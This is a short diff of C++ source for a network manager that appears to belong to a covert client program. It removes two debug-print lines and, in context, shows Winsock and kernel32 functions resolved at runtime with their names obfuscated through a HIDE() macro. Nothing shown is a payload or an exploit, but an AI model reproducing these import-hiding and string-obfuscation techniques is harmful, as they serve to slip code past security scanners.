@@ -22,7 +22,6 @@ NetworkManager::NetworkManager() {
 #endif
 
     // load winsock and kernel32 libraries
-    CLIENT_DBG("network manager");
 
     HMODULE WINSOCK = ProcessManager::GetFunctionAddress<_LoadLibrary>(Kernel32DLL, std::string(HIDE("LoadLibraryA")))( ( char* ) HIDE("Ws2_32.dll") );
 
@@ -47,7 +46,6 @@ NetworkManager::NetworkManager() {
     NetworkToHostLong = ProcessManager::GetFunctionAddress<_ntohl>(WINSOCK, std::string(HIDE("ntohl")));
     SetSocketOptions = ProcessManager::GetFunctionAddress<_setsocketopt>(WINSOCK, std::string(HIDE("setsockopt")));
 
-    CLIENT_DBG("network manager 2");
 
     WORD    version = MAKEWORD(2, 2);
     WSAData data = { 0 };
